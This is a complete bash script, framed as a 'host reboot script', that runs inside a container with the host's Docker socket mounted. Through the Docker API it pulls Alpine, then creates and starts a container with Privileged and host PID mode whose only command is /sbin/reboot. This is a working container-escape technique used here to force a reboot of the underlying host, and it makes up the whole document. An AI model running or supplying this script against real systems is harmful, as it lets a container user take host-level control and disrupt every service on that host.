#!/bin/bash
set -e

echo "[*] Starting host reboot script..."

# --- STEP 1. Check if Docker socket is mounted ---
if [ ! -S /var/run/docker.sock ]; then
    echo "[ERROR] Docker socket not found!"
    echo "        Start the container with: "
    echo "        docker run -it -v /var/run/docker.sock:/var/run/docker.sock <image> bash"
    exit 1
fi

# --- STEP 2. Check for required tools ---
for cmd in curl jq; do
    if ! command -v $cmd &>/dev/null; then
        echo "[*] Installing missing dependency: $cmd"
        if command -v apt-get &>/dev/null; then
            apt-get update -qq && apt-get install -y $cmd >/dev/null
        elif command -v apk &>/dev/null; then
            apk add --no-cache $cmd >/dev/null
        else
            echo "[ERROR] Cannot install $cmd. Install it manually and retry."
            exit 1
        fi
    fi
done

# --- STEP 3. Check if Alpine image exists on host ---
echo "[*] Checking if Alpine image exists on host..."
IMAGE_CHECK=$(curl --silent --unix-socket /var/run/docker.sock http://localhost/images/json | jq -r '.[].RepoTags' | grep -m1 '^alpine:latest$' || true)

if [ -z "$IMAGE_CHECK" ]; then
    echo "[*] Alpine image not found. Pulling..."
    curl --silent --unix-socket /var/run/docker.sock -X POST "http://localhost/images/create?fromImage=alpine:latest" || {
        echo "[ERROR] Failed to pull Alpine image!"
        exit 1
    }
    echo "[*] Alpine image pulled successfully."
else
    echo "[*] Alpine image already available."
fi

# --- STEP 4. Create helper container to reboot host ---
echo "[*] Creating helper container..."
CREATE_OUTPUT=$(curl --silent --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["/sbin/reboot"],"HostConfig":{"Privileged":true,"PidMode":"host"}}' \
    -X POST http://localhost/containers/create)

CID=$(echo "$CREATE_OUTPUT" | jq -r '.Id')

if [ "$CID" == "null" ] || [ -z "$CID" ]; then
    echo "[ERROR] Failed to create reboot container!"
    echo "API Response: $CREATE_OUTPUT"
    exit 1
fi

echo "[*] Created helper container: $CID"

# --- STEP 5. Start helper container ---
echo "[*] Starting helper container to trigger reboot..."
START_OUTPUT=$(curl --silent --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/start)

if [ -n "$START_OUTPUT" ]; then
    echo "[ERROR] Failed to start reboot container!"
    echo "API Response: $START_OUTPUT"
    exit 1
fi

echo "[*] Host reboot initiated. Bye! 🚀"
